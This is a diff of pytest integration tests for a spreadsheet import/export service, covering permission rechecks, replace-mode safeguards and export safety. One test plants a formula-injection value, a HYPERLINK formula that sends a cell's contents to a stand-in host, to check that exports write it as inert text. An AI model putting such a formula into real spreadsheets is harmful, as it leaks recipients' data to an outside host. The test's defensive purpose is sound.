@@ -16,7 +16,7 @@ import pytest_asyncio
 from sqlalchemy import delete, func, select
 
 from app.db.base import async_session_factory
-from app.models import AuditLog, ImportJob, Material, PhysicalPosition
+from app.models import AuditLog, ImportJob, Material, PhysicalPosition, RolePermission, UserMaterialRole
 from app.services import confunfis_extras as extras
 from integration.test_catalog import catalog  # noqa: F401
 from integration.test_confunfis import PUESTO, TRAMONTANA, base, demo  # noqa: F401
@@ -111,7 +111,7 @@ async def test_a_qty_changed_and_a_row_removed_in_both_modes(client, demo):
     data, removed = _changed_demo()
     merge = await analysed(client, demo, analyst, data)
     assert sheet_counts(merge, "CON_FUN_FIS") == {"new": 0, "modified": 1, "unchanged": 45, "removed": 0, "rejected": 0}
-    assert merge["report"]["sheets"]["CON_FUN_FIS"]["modified"][0]["changes"] == [{"field": "qty", "header": "qty", "before": "1", "after": "2"}]
+    assert merge["report"]["sheets"]["CON_FUN_FIS"]["modified"][0]["changes"] == [{"field": "qty", "header": "QTY", "before": "1", "after": "2"}]
 
     # Sustituir: the admin only, and the CUF's name typed.
     assert (await client.post(f"{base(demo)}/import", params={"mode": "replace"}, files={"file": ("L.xlsx", data, XLSX)}, headers=analyst)).status_code == 403
@@ -130,7 +130,7 @@ async def test_a_qty_changed_and_a_row_removed_in_both_modes(client, demo):
     assert next(r for r in live if r.sns == "A22120").qty == 2
     # Analysed before, the merge job is stale now.
     stale = await apply(client, demo, analyst, merge)
-    assert (stale.status_code, stale.json()["detail"]["code"]) == (409, "import_stale")
+    assert (stale.status_code, stale.json()["detail"]["code"]) == (409, "import_book_stale")
 
 
 async def test_the_demo_into_a_new_empty_cuf(client, demo, empty_cuf):
@@ -150,7 +150,7 @@ async def test_the_demo_into_a_new_empty_cuf(client, demo, empty_cuf):
     # Its audit says the import job.
     async with async_session_factory() as session:
         entry = (await session.execute(select(AuditLog).where(AuditLog.action == "confunfis.row_created", AuditLog.material_id == empty_cuf["id"]).limit(1))).scalar_one()
-    assert entry.after["origin"]["import_job"] == job["id"]
+    assert entry.after["import_origin"]["import_job"] == job["id"]
 
 
 async def test_the_exports_are_the_demo_file(client, demo):
@@ -270,3 +270,93 @@ async def test_the_empty_template_filled_by_a_subcontractor(client, demo, empty_
     rows = (await client.get(f"{base(demo, NEW_CUF)}/rows", params={"page_size": 100}, headers=admin)).json()["items"]
     assert sorted(r["sns"] for r in rows) == ["000000", "A20000", "A21030"]
     assert next(r for r in rows if r["sns"] == "A21030")["total"] == "6"
+
+
+async def test_the_export_never_writes_a_formula(client, demo):
+    """A name typed as "=…" (in the app, or a subcontractor's cell) goes out as text, never as a live formula."""
+    async with async_session_factory() as session:
+        row = (await session.execute(select(PhysicalPosition).where(PhysicalPosition.material_id == demo["materials"][TRAMONTANA].id, PhysicalPosition.sns == "A22120"))).scalars().first()
+        row.function_text = '=HYPERLINK("https://example.invalid/?"&A3,"x")'
+        await session.commit()
+    for kind in ("anexo", "aal"):
+        res = await client.get(f"{base(demo)}/export", params={"kind": kind}, headers=demo["people"]["analista"])
+        cells = [c for r in _book(res.content)["CON_FUN_FIS"].iter_rows(min_row=3) for c in r if isinstance(c.value, str) and c.value.startswith("=")]
+        assert cells and all(c.data_type == "s" for c in cells), kind
+
+
+async def test_applying_checks_the_permissions_again(client, demo):
+    """A role lowered between the analysis and the apply: refused (403), nothing written."""
+    analyst = demo["people"]["analista"]
+    data, _removed = _changed_demo()
+    job = await analysed(client, demo, analyst, data)
+    mid = demo["materials"][TRAMONTANA].id
+    async with async_session_factory() as session:
+        link = (await session.execute(select(UserMaterialRole).where(UserMaterialRole.material_id == mid, UserMaterialRole.role_code == "analista"))).scalars().first()
+        link.role_code = "observador"
+        await session.commit()
+    try:
+        refused = await apply(client, demo, analyst, job)
+        assert (refused.status_code, refused.json()["detail"]["code"]) == (403, "permission_denied")
+    finally:
+        async with async_session_factory() as session:
+            link = await session.get(UserMaterialRole, (link.user_id, link.material_id))
+            link.role_code = "analista"
+            await session.commit()
+    async with async_session_factory() as session:
+        qty = (await session.execute(select(PhysicalPosition.qty).where(PhysicalPosition.material_id == mid, PhysicalPosition.sns == "A22120", PhysicalPosition.deleted_at.is_(None)))).scalar_one()
+    assert qty == 1
+
+
+async def test_the_parts_sheet_needs_the_article_permission(client, demo):
+    """The parts are the article's (global): without articulos.editar, a book with parts is blocked."""
+    async with async_session_factory() as session:
+        await session.execute(delete(RolePermission).where(RolePermission.role_code == "analista", RolePermission.permission_code == "articulos.editar"))
+        await session.commit()
+    try:
+        res = await client.post(f"{base(demo)}/import", files={"file": ("L.xlsx", DEMO_BOOK.read_bytes(), XLSX)}, headers=demo["people"]["analista"])
+        job = (await client.get(f"/api/import-jobs/{res.json()['id']}", headers=demo["people"]["analista"])).json()
+        assert [(e["code"], e["sheet"]) for e in job["report"]["errors"]] == [("parts_need_article_permission", "TABLA DE PARTES")]
+        # Without the parts sheet, the book goes in.
+        book = _book(DEMO_BOOK.read_bytes())
+        del book["TABLA DE PARTES"]
+        assert (await analysed(client, demo, demo["people"]["analista"], _bytes(book)))["counts"]["errors"] == 0
+    finally:
+        async with async_session_factory() as session:
+            session.add(RolePermission(role_code="analista", permission_code="articulos.editar"))
+            await session.commit()
+
+
+def test_numbers_by_value_and_texts_as_texts():
+    from decimal import Decimal
+
+    from app.services.anexo_xi_import import _same
+
+    assert _same(Decimal("2.000000"), "2") and _same(Decimal("1"), 1)
+    assert not _same("00123", "123") and not _same("1E2", "100") and not _same(Decimal("1"), "abc")
+
+
+async def test_replace_refuses_a_book_with_rejected_rows(client, demo):
+    """A rejected line still names a record: Sustituir would remove the one it meant to keep."""
+    admin = demo["people"]["admin"]
+    book = _book(DEMO_BOOK.read_bytes())
+    radiator = next(r for r in book["CON_FUN_FIS"].iter_rows(min_row=3) if r[4].value == "A22120")
+    radiator[7].value = "abc"
+    job = await analysed(client, demo, admin, _bytes(book), mode="replace")
+    assert sheet_counts(job, "CON_FUN_FIS")["rejected"] == 1
+    refused = await apply(client, demo, admin, job, confirm_name=TRAMONTANA)
+    assert (refused.status_code, refused.json()["detail"]["code"]) == (409, "import_replace_has_rejected")
+
+
+async def test_replace_counts_what_goes_with_a_removed_row(client, demo):
+    """The radio's row out of the book: its extra function goes with it, and the report says so."""
+    admin = demo["people"]["admin"]
+    exported = (await client.get(f"{base(demo)}/export", params={"kind": "anexo"}, headers=admin)).content
+    book = _book(exported)
+    ws = book["CON_FUN_FIS"]
+    radio = next(r for r in ws.iter_rows(min_row=3) if r[4].value == "E12300")
+    ws.delete_rows(radio[0].row)
+    job = await analysed(client, demo, admin, _bytes(book), mode="replace")
+    gone = job["report"]["sheets"]["FUNCIONES ADICIONALES"]["removed"]
+    assert gone and all(g["with_row"] and g["key"].startswith("E12300") for g in gone)
+    assert job["counts"]["removed"] == sheet_counts(job, "CON_FUN_FIS")["removed"] + len(gone) + len(job["report"]["sheets"].get("INCOMPATIBILIDADES", {}).get("removed", []))
+    assert (await apply(client, demo, admin, job, confirm_name=TRAMONTANA)).status_code == 200
